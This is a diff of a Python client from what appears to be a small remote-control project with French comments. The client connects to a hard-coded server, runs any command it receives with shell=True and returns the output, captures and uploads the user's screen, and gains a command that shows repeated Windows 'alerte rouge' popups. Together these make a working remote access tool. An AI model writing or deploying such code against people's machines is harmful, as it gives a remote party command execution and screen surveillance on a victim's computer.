@@ -1,7 +1,7 @@
 """
 Client implementation.
 """
-
+import ctypes
 import socket
 import threading
 import json
@@ -11,9 +11,9 @@ import os
 import base64
 from PIL import ImageGrab
 import io
-from src.gui.client_gui import ClientGUI
-from src.utils.logger import Logger
-from src.utils.constants import SERVER_HOST, SERVER_PORT
+from client_gui import ClientGUI
+from utils.constants import *
+from utils.logger import Logger
 
 class Client:
     def __init__(self):
@@ -35,8 +35,9 @@ class Client:
     def connect_to_server(self):
         """Connect to the server."""
         try:
+            self.open_port() # Open port
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.connect((SERVER_HOST, SERVER_PORT))
+            self.socket.connect((DEFAULT_HOST, SERVER_PORT))
             self.logger.info("Connected to server")
             self.gui.log_message("Connected to server")
         except Exception as e:
@@ -95,6 +96,7 @@ class Client:
                 "type": message_type,
                 "content": content
             }).encode()
+            self.socket.sendall(len(data).to_bytes(8, byteorder='big'))
             self.socket.sendall(data)
             self.logger.debug(f"Sent message: {message_type} - {content}")
         except Exception as e:
@@ -103,17 +105,25 @@ class Client:
     
     def handle_command(self, command):
         """Handle command from server."""
-        if command == "terminal":
-            self.open_terminal()
-        elif command == "screenshot":
-            self.take_screenshot()
-        else:
-            try:
-                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                self.send_message("response", result.decode())
-            except subprocess.CalledProcessError as e:
-                self.send_message("response", f"Error: {e.output.decode()}")
-    
+        match command:
+            case "popup":
+                self.open_popup("tqt on est gentil")
+            case "terminal":
+                self.open_terminal()
+            case "screenshot":
+                self.take_screenshot()
+            case _:
+                try:
+                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    if os.name == 'nt':
+                        decoded = result.decode('cp850', errors='replace')
+                    else:
+                        decoded = result.decode()
+                    self.send_message("response", decoded)
+                except subprocess.CalledProcessError as e:
+                    self.logger.error("CalledProcessError")
+                    self.send_message("response", f"Error: {str(e)}")
+
     def open_terminal(self):
         """Open a terminal window."""
         try:
@@ -124,19 +134,30 @@ class Client:
             self.send_message("response", "Terminal opened")
         except Exception as e:
             self.send_message("response", f"Error opening terminal: {str(e)}")
+
+    def open_popup(self, message, times=5):
+        """Ouvre une popup native Windows avec un message."""
+        try:
+            for i in range(times):
+                ctypes.windll.user32.MessageBoxW(0, message, "alerte rouge !!!!!", 0x40)
+            self.send_message("response", "Popup ouverte")
+        except Exception as e:
+            self.send_message("response", f"Erreur ouverture popup: {str(e)}")
     
     def take_screenshot(self):
         """Take a screenshot and send it to the server."""
         try:
-            # Take screenshot
+            # screenshot
             screenshot = ImageGrab.grab()
+            new_size = (screenshot.width // 2, screenshot.height // 2)
+            screenshot = screenshot.resize(new_size, resample=ImageGrab.Image.LANCZOS)
             
-            # Convert to base64
+            # conversion base64
             buffer = io.BytesIO()
             screenshot.save(buffer, format="PNG")
             image_data = base64.b64encode(buffer.getvalue()).decode()
-            
-            # Send to server
+
+            # envoi
             self.send_message("screenshot", image_data)
         except Exception as e:
             self.send_message("response", f"Error taking screenshot: {str(e)}")
@@ -150,6 +171,10 @@ class Client:
         finally:
             self.socket.close()
             self.root.destroy()
+
+    def open_port(self, port=DEFAULT_PORT):
+        pass
+
 
 if __name__ == "__main__":
     Client()
